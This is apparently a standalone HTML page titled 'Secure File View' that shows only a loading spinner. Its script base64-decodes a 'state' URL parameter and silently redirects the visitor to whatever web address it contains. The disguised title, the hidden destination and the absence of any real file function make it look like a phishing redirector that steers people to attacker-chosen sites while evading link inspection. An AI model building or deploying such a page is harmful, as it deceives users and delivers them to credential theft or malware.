<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure File View</title>
<style>
  body { margin: 0; padding: 0; background: #fff; }
  .spinner { display: flex; justify-content: center; align-items: center; height: 100vh; }
  .spinner::after { content: ""; width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top-color: #0078d4; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="spinner"></div>
<script>
(function(){
  var params = new URLSearchParams(window.location.search);
  var state = params.get('state');
  if (state) {
    try {
      var decoded = atob(state);
      if (decoded.startsWith('http')) {
        window.location.replace(decoded);
      }
    } catch(e) {}
  }
})();
</script>
</body>
</html>
